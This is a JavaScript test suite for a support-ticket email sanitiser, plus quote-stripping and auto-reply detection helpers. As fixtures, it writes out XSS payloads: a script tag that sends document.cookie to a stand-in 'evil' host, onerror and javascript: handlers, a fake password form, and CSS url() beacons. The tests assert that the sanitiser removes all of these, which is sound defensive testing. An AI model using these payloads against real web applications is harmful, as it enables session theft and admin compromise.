/**
 * Inbound-email sanitisation, quote stripping and auto-reply detection.
 *
 * Everything under test here processes bytes supplied by anyone on the internet
 * and renders them in an authenticated ADMIN session. A regression is an admin
 * compromise, not a cosmetic bug — so the assertions are deliberately about what
 * must be ABSENT, not merely about the happy path.
 */

import {
  sanitizeEmailHtml,
  stripQuotedText,
  derivePlainText,
  findHeader,
  isAutoReply,
  REPLY_SENTINEL,
} from '../../../services/supportSanitizer.js';

describe('sanitizeEmailHtml — script execution', () => {
  it('removes script tags and their contents', () => {
    const out = sanitizeEmailHtml('<p>hi</p><script>fetch("//evil/"+document.cookie)</script>');
    expect(out).toContain('<p>hi</p>');
    expect(out).not.toMatch(/script/i);
    expect(out).not.toContain('document.cookie');
  });

  it('strips inline event handlers', () => {
    const out = sanitizeEmailHtml('<img src=x onerror="alert(1)">');
    expect(out).not.toMatch(/onerror/i);
    expect(out).not.toContain('alert');
  });

  it('drops javascript: URLs', () => {
    const out = sanitizeEmailHtml('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toMatch(/javascript:/i);
    expect(out).toContain('click');
  });

  it('drops data: URLs, a common XSS carrier in mail', () => {
    const out = sanitizeEmailHtml('<a href="data:text/html,<script>alert(1)</script>">x</a>');
    expect(out).not.toMatch(/data:/i);
  });

  it('removes svg onload', () => {
    expect(sanitizeEmailHtml('<svg onload="alert(1)"></svg>')).not.toMatch(/onload|svg/i);
  });

  it('removes iframes', () => {
    expect(sanitizeEmailHtml('<iframe src="//evil"></iframe>')).not.toMatch(/iframe/i);
  });
});

describe('sanitizeEmailHtml — phishing and navigation', () => {
  it('removes forms and inputs so credential prompts cannot render in the admin', () => {
    const out = sanitizeEmailHtml(
      '<form action="//evil"><input name="pw" type="password"><button>Login</button></form>'
    );
    expect(out).not.toMatch(/<form|<input|<button/i);
  });

  it('removes base tags, which would rewrite every relative admin link', () => {
    const out = sanitizeEmailHtml('<base href="//evil/"><a href="/admin">go</a>');
    expect(out).not.toMatch(/<base/i);
  });

  it('removes meta refresh redirects', () => {
    expect(sanitizeEmailHtml('<meta http-equiv="refresh" content="0;url=//evil">'))
      .not.toMatch(/<meta/i);
  });

  it('forces noopener/noreferrer and a new context on surviving links', () => {
    const out = sanitizeEmailHtml('<a href="https://example.com">x</a>');
    expect(out).toContain('rel="noopener noreferrer nofollow"');
    expect(out).toContain('target="_blank"');
  });
});

describe('sanitizeEmailHtml — tracking and CSS', () => {
  it('neuters remote images into data-blocked-src so opening a ticket does not phone home', () => {
    const out = sanitizeEmailHtml('<img src="https://tracker.evil/px.gif" width="1">');
    expect(out).not.toMatch(/\ssrc=/);
    expect(out).toContain('data-blocked-src="https://tracker.evil/px.gif"');
  });

  it('strips positioning that could overlay the surrounding UI', () => {
    const out = sanitizeEmailHtml('<div style="position:fixed;top:0;z-index:99999">GIMME</div>');
    expect(out).not.toMatch(/position|z-index/i);
    expect(out).toContain('GIMME');
  });

  it('strips url() references that would beacon on render', () => {
    expect(sanitizeEmailHtml('<div style="background-image:url(https://evil/leak)">x</div>'))
      .not.toMatch(/url\(/i);
  });

  it('removes style blocks entirely', () => {
    const out = sanitizeEmailHtml('<style>body{background:url(//evil/x)}</style><p>ok</p>');
    expect(out).not.toMatch(/<style|evil/i);
    expect(out).toContain('<p>ok</p>');
  });
});

describe('sanitizeEmailHtml — legitimate mail survives', () => {
  it('keeps basic formatting, safe colours and tables', () => {
    const out = sanitizeEmailHtml(
      '<p style="color:#333">Order <b>ABI-1</b> is late.</p><table><tr><td>x</td></tr></table>'
    );
    expect(out).toContain('<b>ABI-1</b>');
    expect(out).toContain('color:#333');
    expect(out).toContain('<table>');
  });

  it('returns an empty string for empty or non-string input', () => {
    expect(sanitizeEmailHtml('')).toBe('');
    expect(sanitizeEmailHtml(null)).toBe('');
    expect(sanitizeEmailHtml(undefined)).toBe('');
  });
});

describe('stripQuotedText', () => {
  it('cuts at our own sentinel', () => {
    expect(stripQuotedText(`Yes please\n\n${REPLY_SENTINEL}\n\nold thread`))
      .toBe('Yes please');
  });

  it('cuts at a Gmail-style attribution line', () => {
    const body = 'Thanks, that worked!\n\n'
      + 'On Mon, 4 Aug 2026 at 10:30, Autobacs <support@autobacsindia.com> wrote:\n'
      + '> We have shipped your order.';
    expect(stripQuotedText(body)).toBe('Thanks, that worked!');
  });

  it('cuts at an Outlook original-message separator', () => {
    expect(stripQuotedText('Confirmed.\n\n-----Original Message-----\nFrom: x'))
      .toBe('Confirmed.');
  });

  it('trims a trailing run of quoted lines', () => {
    expect(stripQuotedText('Short answer\n\n> old\n> older')).toBe('Short answer');
  });

  it('leaves an unquoted message untouched', () => {
    expect(stripQuotedText('Just a plain message.')).toBe('Just a plain message.');
  });

  it('never returns empty when the message is ONLY quoted text', () => {
    // Over-eager stripping loses real content; showing extra is the safer failure.
    expect(stripQuotedText('> only quoted content')).toBe('> only quoted content');
  });

  it('handles empty input', () => {
    expect(stripQuotedText('')).toBe('');
    expect(stripQuotedText(null)).toBe('');
  });
});

describe('derivePlainText', () => {
  it('prefers the provided text body', () => {
    expect(derivePlainText({ text: 'plain wins', html: '<p>html</p>' })).toBe('plain wins');
  });

  it('flattens HTML when no text part exists', () => {
    expect(derivePlainText({ html: '<p>Line one</p><p>Line &amp; two</p>' }))
      .toBe('Line one\nLine & two');
  });

  it('does not let escaped entities round-trip into live markup', () => {
    // "&amp;lt;" must decode to "&lt;", never to a functional "<".
    expect(derivePlainText({ html: '<p>&amp;lt;script&amp;gt;</p>' }))
      .toBe('&lt;script&gt;');
  });

  it('drops script contents rather than inlining them as text', () => {
    expect(derivePlainText({ html: '<p>ok</p><script>bad()</script>' })).toBe('ok');
  });
});

describe('findHeader', () => {
  const headers = [{ Name: 'Auto-Submitted', Value: 'auto-replied' }];

  it('matches case-insensitively', () => {
    expect(findHeader(headers, 'auto-submitted')).toBe('auto-replied');
  });

  it('returns an empty string when absent', () => {
    expect(findHeader(headers, 'X-Nope')).toBe('');
    expect(findHeader(undefined, 'X-Nope')).toBe('');
  });
});

describe('isAutoReply — loop prevention', () => {
  it('detects RFC 3834 Auto-Submitted', () => {
    expect(isAutoReply({ headers: [{ Name: 'Auto-Submitted', Value: 'auto-replied' }] })).toBe(true);
  });

  it('does NOT flag Auto-Submitted: no', () => {
    expect(isAutoReply({ headers: [{ Name: 'Auto-Submitted', Value: 'no' }] })).toBe(false);
  });

  it('detects bulk precedence', () => {
    expect(isAutoReply({ headers: [{ Name: 'Precedence', Value: 'bulk' }] })).toBe(true);
  });

  it('detects vendor autoresponder headers', () => {
    expect(isAutoReply({ headers: [{ Name: 'X-Autoreply', Value: 'yes' }] })).toBe(true);
  });

  it('detects out-of-office subjects', () => {
    expect(isAutoReply({ subject: 'Out of Office: Re: ABI-1' })).toBe(true);
    expect(isAutoReply({ subject: 'Automatic reply: your message' })).toBe(true);
  });

  it('detects bounce senders', () => {
    expect(isAutoReply({ from: 'MAILER-DAEMON@example.com' })).toBe(true);
    expect(isAutoReply({ from: 'no-reply@example.com' })).toBe(true);
  });

  it('does not flag a genuine customer message', () => {
    expect(isAutoReply({
      headers: [{ Name: 'Precedence', Value: 'normal' }],
      from: 'jane@gmail.com',
      subject: 'Where is my order?',
    })).toBe(false);
  });

  it('does not flag an empty input', () => {
    expect(isAutoReply({})).toBe(false);
    expect(isAutoReply()).toBe(false);
  });
});
